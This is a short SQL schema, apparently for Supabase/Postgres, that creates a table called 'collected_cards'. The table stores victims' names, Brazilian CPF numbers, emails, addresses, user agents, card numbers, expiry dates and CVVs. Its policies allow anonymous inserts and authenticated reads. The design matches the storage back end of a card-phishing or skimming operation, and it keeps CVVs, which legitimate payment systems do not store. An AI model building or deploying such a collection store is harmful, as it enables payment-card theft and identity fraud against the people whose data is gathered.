create table if not exists public.collected_cards (
  id uuid default gen_random_uuid() primary key,
  created_at timestamp with time zone default timezone('utc'::text, now()) not null,
  nome text,
  cpf text,
  email text,
  endereco text,
  user_agent text,
  numero text,
  validade text,
  cvv text
);

alter table public.collected_cards enable row level security;

create policy "Permitir inserção anônima" on public.collected_cards
  for insert
  with check (true);

create policy "Permitir leitura autenticada" on public.collected_cards
  for select
  to authenticated
  using (true);
